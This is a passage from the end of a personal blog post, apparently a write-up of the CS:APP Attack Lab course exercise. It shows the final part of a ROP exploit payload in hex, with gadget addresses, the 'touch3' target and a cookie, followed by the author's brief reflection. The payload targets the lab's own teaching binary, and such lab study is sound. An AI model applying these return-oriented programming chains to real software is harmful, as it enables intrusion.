class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="comment">// mov %eax, %edx</span></span><br><span class="line"><span class="number">70</span> <span class="number">1</span>a <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="comment">// mov %edx, %ecx </span></span><br><span class="line"><span class="number">13</span> <span class="number">1</span>a <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="comment">// mov %ecx, %esi</span></span><br><span class="line">d6 <span class="number">19</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="comment">// lea (%rdi,%rsi,1),%rax</span></span><br><span class="line">a2 <span class="number">19</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="comment">// mov %rax, %rdi</span></span><br><span class="line">fa <span class="number">18</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="comment">// addr of touch3</span></span><br><span class="line"><span class="number">35</span> <span class="number">39</span> <span class="number">62</span> <span class="number">39</span> <span class="number">39</span> <span class="number">37</span> <span class="number">66</span> <span class="number">61</span> <span class="comment">// cookie</span></span><br></pre></td></tr></table></figure>
<hr>
<p>作为一名pwn手，感觉这些都很基础</p>
<p>以前一直依赖 pwntools 进行攻击，现在感受了一把手工入侵，算是长见识了吧</p>

    </div>

    
    
    

      <footer class="post-footer">
          
          <div class="post-tags">
              <a href="/tags/labs/" rel="tag"><i class="fa fa-tag"></i> labs</a>
              <a href="/tags/CSapp/" rel="tag"><i class="fa fa-tag"></i> CSapp</a>
          </div>

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2022/02/22/CSapp-Malloc%20Lab/" rel="prev" title="CSapp-Malloc Lab">
      <i class="fa fa-chevron-left"></i> CSapp-Malloc Lab
    </a></div>
      <div class="post-nav-item">
    <a href="/2022/02/26/CSapp-Cache%20Lab/" rel="next" title="CSapp-Cache Lab">
      CSapp-Cache Lab <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Attack-Lab"><span class="nav-number">1.</span> <span class="nav-text">Attack Lab</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%9E%E9%AA%8C%E8%AF%B4%E6%98%8E"><span class="nav-number">2.</span> <span class="nav-text">实验说明</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA"><span class="nav-number">3.</span> <span class="nav-text">缓冲区溢出</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB"><span class="nav-number">4.</span> <span class="nav-text">代码注入攻击</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ROP%E6%94%BB%E5%87%BB"><span class="nav-number">5.</span> <span class="nav-text">ROP攻击</span></a></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="yhellow"
      src="/images/avatar.gif">
  <p class="site-author-name" itemprop="name">yhellow</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">239</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">12</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">139</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 2019 – 
  <span itemprop="copyrightYear">2023</span>
  <span class="with-love">
    <i class="heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">yhellow</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-area"></i>
    </span>
    <span title="Symbols count total">3.2m</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="Reading time total">48:18</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
  </div>

        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="user"></i>
      </span>
      <span class="site-uv" title="Total Visitors">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="eye"></i>
      </span>
      <span class="site-pv" title="Total Views">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

  

</body>
</html>
